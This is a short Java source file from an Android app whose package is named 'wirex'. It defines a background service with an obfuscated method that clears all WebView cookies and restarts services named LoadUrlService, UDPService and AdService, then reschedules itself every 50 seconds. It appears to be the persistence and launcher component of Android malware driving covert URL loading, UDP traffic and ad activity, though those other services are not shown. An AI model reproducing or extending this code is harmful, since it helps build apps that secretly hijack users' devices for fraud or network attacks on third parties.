package com.fsoc131y.wirex.service;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;

public class StartService extends Service {

  public IBinder onBind(Intent intent) {
    return null;
  }

  public void onCreate() {
    super.onCreate();
    snewxwriS();
  }

  public void snewxwriS() {
    if (Build.VERSION.SDK_INT >= 21) {
      CookieManager.getInstance().removeAllCookies(null);
      CookieManager.getInstance().flush();
    } else {
      CookieSyncManager.createInstance(getApplicationContext());
      CookieManager.getInstance().removeAllCookie();
    }

    Intent intent = new Intent(this, LoadUrlService.class);
    stopService(intent);
    startService(intent);

    intent = new Intent(this, UDPService.class);
    stopService(intent);
    startService(intent);

    intent = new Intent(this, AdService.class);
    stopService(intent);
    startService(intent);

    new Handler().postDelayed(new Runnable() {
      public void run() {
        snewxwriS();
      }
    }, 50000);
  }
}
